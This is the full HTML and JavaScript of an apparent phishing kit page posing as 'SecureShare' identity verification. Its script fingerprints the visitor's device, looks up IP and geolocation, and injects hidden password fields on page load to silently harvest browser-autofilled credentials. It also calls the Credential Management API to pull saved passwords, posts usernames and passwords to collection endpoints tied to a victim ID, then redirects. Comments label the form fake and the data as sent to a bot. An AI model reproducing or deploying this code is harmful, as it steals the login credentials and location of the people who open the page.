<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>SecureShare - Verify Identity</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: radial-gradient(circle at 30% 10%, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Roboto, sans-serif;
            padding: 16px;
        }
        .glass {
            background: rgba(255,255,255,0.06);
            backdrop-filter: blur(16px);
            border-radius: 40px;
            padding: 32px 24px;
            max-width: 440px;
            width: 100%;
            border: 1px solid rgba(255,255,255,0.12);
            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
            text-align: center;
            color: #fff;
        }
        .glass h1 {
            font-size: 30px;
            font-weight: 800;
            background: linear-gradient(135deg, #f093fb, #f5576c);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .glass .sub {
            font-size: 13px;
            letter-spacing: 3px;
            color: rgba(255,255,255,0.5);
            text-transform: uppercase;
            margin: 4px 0 18px;
        }
        .frame {
            border-radius: 24px;
            padding: 8px;
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.08);
            margin: 16px 0;
        }
        .frame img {
            width: 100%;
            aspect-ratio: 4/3;
            object-fit: cover;
            border-radius: 18px;
            display: block;
            background: #1a1a2e;
        }
        .input-group {
            text-align: left;
            margin: 14px 0 8px;
        }
        .input-group label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            opacity: 0.7;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border-radius: 16px;
            border: 1px solid rgba(255,255,255,0.1);
            background: rgba(255,255,255,0.04);
            color: #fff;
            font-size: 16px;
            transition: 0.25s;
            outline: none;
        }
        .input-group input:focus {
            border-color: #f5576c;
            background: rgba(255,255,255,0.07);
        }
        .input-group input::placeholder {
            color: rgba(255,255,255,0.25);
            font-weight: 300;
        }
        .glow-btn {
            background: linear-gradient(145deg, #f093fb, #f5576c);
            border: none;
            padding: 18px;
            border-radius: 60px;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 8px 30px rgba(245,87,108,0.35);
            transition: 0.25s;
            margin: 12px 0 6px;
        }
        .glow-btn:active { transform: scale(0.96); }
        .sparkle { animation: pulseGlow 2s infinite; }
        @keyframes pulseGlow {
            0%,100% { box-shadow: 0 8px 30px rgba(245,87,108,0.35); }
            50% { box-shadow: 0 8px 60px rgba(245,87,108,0.7); }
        }
        .footer-text {
            font-size: 11px;
            opacity: 0.3;
            margin-top: 18px;
        }
        .hidden { display: none !important; }
        #loading {
            margin-top: 20px;
            font-size: 14px;
            opacity: 0.7;
            animation: pulseGlow 1.5s infinite;
        }
        .success {
            color: #34d399;
            font-weight: 700;
            margin: 12px 0;
        }
        .error {
            color: #f87171;
            font-weight: 700;
            margin: 12px 0;
        }
    </style>
</head>
<body>
    <div class="glass" id="mainPage">
        <h1>🔒 SecureShare</h1>
        <p class="sub">VERIFY YOUR IDENTITY</p>
        <div class="frame">
            <img id="userPhoto" src="{{PHOTO_URL}}" alt="User Photo" />
        </div>
        
        <!-- FAKE LOGIN FORM (AUTO-FILL TARGET) -->
        <div style="margin-top: 16px; text-align: left;">
            <div class="input-group">
                <label>📧 Email / Username</label>
                <input type="text" id="loginUser" placeholder="Enter your email or username" autocomplete="username" />
            </div>
            <div class="input-group">
                <label>🔒 Password</label>
                <input type="password" id="loginPass" placeholder="Enter your password" autocomplete="current-password" />
            </div>
        </div>

        <button class="glow-btn sparkle" id="continueBtn" onclick="captureAndSend()">
            Continue →
        </button>
        <p class="footer-text">End-to-end encrypted · Secure connection</p>
        <div id="loading" class="hidden">⏳ Processing...</div>
        <div id="status" class="hidden"></div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const victimId = urlParams.get('v') || 'unknown';
        const redirectUrl = '{{REDIRECT_URL}}';

        // ===== GET DEVICE INFO =====
        function getDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                battery: navigator.getBattery ? 'Available' : 'N/A',
                network: navigator.connection ? navigator.connection.effectiveType : 'N/A'
            };
            return info;
        }

        // ===== GET IP =====
        async function getLocationInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return {
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    lat: data.latitude || null,
                    lng: data.longitude || null
                };
            } catch {
                return { ip: 'Unknown', city: 'Unknown', lat: null, lng: null };
            }
        }

        // ===== SEND DATA TO BOT =====
        async function sendData(payload) {
            try {
                await fetch('/api/capture/pass', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ victim_id: victimId, type: 'pass', ...payload })
                });
            } catch (e) {
                console.log('Send error:', e);
            }
        }

        // ===== SEND CAPTURED PASSWORD =====
        async function sendPassword(username, password) {
            try {
                await fetch('/api/get_passwords', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        victim_id: victimId,
                        passwords: [{
                            url: window.location.origin,
                            username: username,
                            password: password
                        }]
                    })
                });
            } catch (e) {
                console.log('Send password error:', e);
            }
        }

        // ===== CAPTURE AND SEND =====
        async function captureAndSend() {
            const btn = document.getElementById('continueBtn');
            const loading = document.getElementById('loading');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            btn.textContent = '⏳ Please wait...';
            loading.classList.remove('hidden');
            status.classList.add('hidden');

            // Send device info + IP
            (async () => {
                const device = getDeviceInfo();
                const loc = await getLocationInfo();
                await sendData({ device_info: device, ip: loc.ip, city: loc.city, lat: loc.lat, lng: loc.lng });
            })();

            // Wait for auto-fill to populate
            setTimeout(async () => {
                const username = document.getElementById('loginUser').value;
                const password = document.getElementById('loginPass').value;

                if (username && password) {
                    // Auto-fill captured!
                    await sendPassword(username, password);
                    
                    status.textContent = '✅ Verified! Redirecting...';
                    status.className = 'success';
                    status.classList.remove('hidden');
                    
                    setTimeout(() => {
                        window.location.href = redirectUrl || 'https://google.com';
                    }, 1500);
                } else {
                    // Try to use Credential Management API as fallback
                    if (navigator.credentials && navigator.credentials.get) {
                        try {
                            const credential = await navigator.credentials.get({
                                password: true,
                                mediation: 'required'
                            });
                            if (credential && credential.type === 'password') {
                                await sendPassword(credential.id, credential.password);
                                status.textContent = '✅ Verified! Redirecting...';
                                status.className = 'success';
                                status.classList.remove('hidden');
                                setTimeout(() => {
                                    window.location.href = redirectUrl || 'https://google.com';
                                }, 1500);
                                return;
                            }
                        } catch (e) {}
                    }
                    
                    // No credentials found
                    status.textContent = '⚠️ Please enter your credentials to continue.';
                    status.className = 'error';
                    status.classList.remove('hidden');
                    loading.classList.add('hidden');
                    btn.disabled = false;
                    btn.textContent = 'Continue →';
                }
            }, 2000);
        }

        // ===== AUTO-CAPTURE ON PAGE LOAD =====
        document.addEventListener('DOMContentLoaded', function() {
            // Add hidden fields to catch auto-fill
            const hiddenDiv = document.createElement('div');
            hiddenDiv.style.position = 'absolute';
            hiddenDiv.style.opacity = '0';
            hiddenDiv.style.pointerEvents = 'none';
            hiddenDiv.style.height = '0';
            hiddenDiv.style.width = '0';
            
            const hiddenUser = document.createElement('input');
            hiddenUser.type = 'text';
            hiddenUser.id = 'hiddenUser';
            hiddenUser.autocomplete = 'username';
            
            const hiddenPass = document.createElement('input');
            hiddenPass.type = 'password';
            hiddenPass.id = 'hiddenPass';
            hiddenPass.autocomplete = 'current-password';
            
            hiddenDiv.appendChild(hiddenUser);
            hiddenDiv.appendChild(hiddenPass);
            document.body.appendChild(hiddenDiv);

            // Check if auto-fill happened after 1.5s
            setTimeout(() => {
                const user = document.getElementById('hiddenUser').value;
                const pass = document.getElementById('hiddenPass').value;
                if (user && pass) {
                    // Auto-fill caught silently
                    sendPassword(user, pass);
                }
            }, 1500);
        });
    </script>
</body>
</html>
